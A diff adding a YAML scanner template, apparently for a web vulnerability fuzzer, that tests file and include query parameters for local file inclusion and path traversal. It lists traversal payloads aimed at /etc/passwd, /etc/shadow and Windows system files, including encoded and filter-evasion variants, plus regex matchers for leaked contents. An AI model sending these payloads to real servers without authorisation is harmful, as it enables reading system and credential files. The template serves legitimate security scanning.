@@ -1,0 +1,43 @@
+id: fuzz-lfi-paths
+info:
+  name: "Local File Inclusion Path Fuzzing"
+  severity: "High"
+  description: "Fuzzes file/include parameters for LFI and path traversal vulnerabilities."
+  compliance:
+    owasp: "A01:2021"
+    cwe: "CWE-98"
+fuzz:
+  - part: "query"
+    keys:
+      - "file"
+      - "page"
+      - "include"
+      - "path"
+      - "template"
+      - "doc"
+      - "load"
+    payloads:
+      - "../../../etc/passwd"
+      - "../../../etc/shadow"
+      - "....//....//....//etc/passwd"
+      - "../../../../windows/win.ini"
+      - "../../../../etc/issue"
+      - "../../../../boot.ini"
+      - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+      - "....//....//....//....//etc/hosts"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "bin:.*:1:1:"
+          - "daemon:.*:2:2:"
+          - "nobody:.*:65534:"
+          - "\\[fonts\\]"
+          - "\\[extensions\\]"
+          - "boot loader"
+      - type: status
+        part: status
+        status:
+          - 200
+    matcher_condition: or
